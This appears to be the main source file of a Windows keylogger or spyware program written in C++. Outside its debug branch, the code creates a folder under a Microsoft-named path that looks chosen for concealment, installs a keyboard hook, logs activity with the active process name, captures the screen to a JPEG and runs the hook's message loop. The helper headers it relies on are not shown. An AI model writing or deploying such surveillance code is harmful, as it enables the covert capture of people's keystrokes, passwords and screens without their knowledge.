#include "stream.h"
#include "keyhook.h"
#include "screen.h"

#define DEBUG_BUILD

#ifdef DEBUG_BUILD
#define DEB(x) std::cout << #x << " - " << x << std::endl;
#endif

int main() {
  DEB(stream::GetPath())

#ifndef DEBUG_BUILD
  stream::MakeDir(stream::GetPath("\\Microsoft\\blxr"));
  key_hook::InstallHook();

  stream::WriteLog("[*] BOOT [*]", key_hook::active_process, true);

  screen::CaptureScreen(stream::GetPath("\\Microsoft\\blxr", true), "screen.jpeg");

  key_hook::HandleMessage(true);
#endif
  return 0;
}
